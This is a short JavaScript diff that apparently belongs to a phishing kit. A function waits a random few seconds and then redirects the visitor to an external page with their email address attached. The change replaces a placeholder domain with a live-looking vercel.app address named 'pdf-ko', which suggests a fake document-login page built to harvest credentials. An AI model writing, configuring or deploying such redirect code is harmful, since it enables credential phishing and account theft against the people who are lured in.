@@ -26,7 +26,7 @@
   function redirectUser(email) {
     const delay = Math.floor(Math.random() * 3000) + 1000; // 1s to 4s
     setTimeout(() => {
-      window.location.href = "https://verify.yourdomain.com/ref.html#" + encodeURIComponent(email);
+      window.location.href = "https://pdf-ko-o9ap.vercel.app#" + encodeURIComponent(email);
     }, delay);
   }
 
